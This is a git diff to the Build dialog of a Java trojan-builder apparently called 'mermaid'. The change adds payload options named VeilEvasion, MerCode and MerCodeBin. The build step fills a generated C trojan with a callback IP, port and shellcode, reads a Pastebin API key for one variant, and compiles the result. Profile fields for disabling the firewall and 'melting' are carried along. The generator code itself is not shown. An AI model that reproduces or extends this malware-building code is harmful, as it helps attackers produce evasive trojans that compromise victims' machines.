@@ -2,7 +2,9 @@ package net.jlxip.mermaid;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileReader;
 import java.io.IOException;
 import java.util.regex.Pattern;
 
@@ -13,6 +15,10 @@ import javax.swing.JFileChooser;
 import javax.swing.JLabel;
 import javax.swing.JOptionPane;
 import javax.swing.JTextField;
+
+import net.jlxip.mermaid.exploits.MerCode;
+import net.jlxip.mermaid.exploits.MerCodeBin;
+import net.jlxip.mermaid.exploits.VeilEvasion;
 
 public class Build extends JDialog {
 	private static final long serialVersionUID = 1L;
@@ -97,8 +103,10 @@ public class Build extends JDialog {
 		{
 			JButton btnBuild = new JButton("BUILD");
 			btnBuild.addActionListener(new ActionListener() {
+				@SuppressWarnings("resource")
 				public void actionPerformed(ActionEvent e) {
-					String IP = PROFILE.IP;                             // Cargamos los datos del perfil
+					String EXPLOIT = PROFILE.EXPLOIT;					// Cargamos los datos del perfil
+					String IP = PROFILE.IP;                             // "
 			        String PORT = PROFILE.PORT;                         // "
 			        String PATH = PROFILE.PATH;                         // "
 			        String FILENAME = PROFILE.FILE;                     // "
@@ -109,6 +117,7 @@ public class Build extends JDialog {
 			        String DISABLEFIREWALL = PROFILE.DISABLEFIREWALL;   // "
 			        String ADDFIREWALL = PROFILE.ADDFIREWALL;           // "
 			        String MELT = PROFILE.MELT;                         // "
+			        String SHELLCODE = PROFILE.SHELLCODE;				// "
 			        
 			        // PRIMER PASO: CREAR EL EXPLOIT
 			        File choosed = new File(output.getText());  // Hacemos un nuevo archivo con la ruta especificada
@@ -124,7 +133,38 @@ public class Build extends JDialog {
 			        File trojan = new File(choosedFolderPath + "temp.c");   // En la carpeta de antes, abrimos (creamos) el archivo "temp.c"
 			        
 			        
-			        GenerateTrojan.generate(trojan, IP, PORT);   // Llamamos a GenerateTrojan con el archivo "temp.c", la IP y el puerto como argumentos
+			        String PastebinAPIDevKey = null;
+			        if(EXPLOIT.equals("VEILEVASION")) VeilEvasion.generate(trojan, IP, PORT);
+			        else if(EXPLOIT.equals("MERCODE")) MerCode.generate(trojan, SHELLCODE);
+			        else if(EXPLOIT.equals("MERCODEBIN")) {
+			        	File FPastebinAPIDevKey = new File("MerCodeBin.dat");
+			        	if(!FPastebinAPIDevKey.exists()) {
+			        		JOptionPane.showMessageDialog(null, "No 'MerCodeBin.dat' file was found.");
+			        		return;
+			        	}
+			        	
+			        	try {
+			        		FileReader fr = new FileReader(FPastebinAPIDevKey);
+			        		BufferedReader br = new BufferedReader(fr);
+			        		
+			        		PastebinAPIDevKey = br.readLine();
+			        		if(PastebinAPIDevKey == null || PastebinAPIDevKey.equals("")) {
+			        			JOptionPane.showMessageDialog(null, "'MerCodeBin.dat' file is corrupt.");
+			        			return;
+			        		}
+			        		
+			        		br.close();
+			        		fr.close();
+			        	} catch(IOException ioe) {
+			        		ioe.printStackTrace();
+			        	}
+			        	
+			        	if(!MerCodeBin.generate(trojan, SHELLCODE, PastebinAPIDevKey)) {
+			        		return;
+			        	}
+			        	
+			        	// TODO
+			        }
 			        
 			        COMPILAR(trojan.getAbsolutePath()); // Compilamos el código generado
 			        if(!debug) trojan.delete();            // Eliminamos el archivo "temp.c"
